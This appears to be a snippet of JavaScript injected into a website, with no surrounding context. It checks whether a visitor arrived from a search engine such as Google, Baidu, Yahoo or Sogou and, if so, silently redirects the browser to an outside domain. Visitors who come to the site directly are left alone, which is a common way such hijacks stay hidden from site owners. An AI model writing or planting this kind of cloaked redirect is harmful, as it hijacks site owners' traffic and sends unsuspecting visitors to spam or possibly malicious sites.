
if(window.name != 'ad_app6'){ 
  var r = document.referrer; 
  r = r.toLowerCase(); 
  var aSites = new Array('google.','baidu.','soso.','so.','360.','yahoo.','youdao.','sogou.','gougou.'); 
  var b = false; 
  for (i in aSites){ 
    if (r.indexOf(aSites[i]) > 0){ 
      b = true; 
      break; 
    } 
  } 
  if(b) 
  { 
    self.location = 'http://haohaori.xyz'; 
    window.adworkergo = 'ad_app6'; 
  } 
}
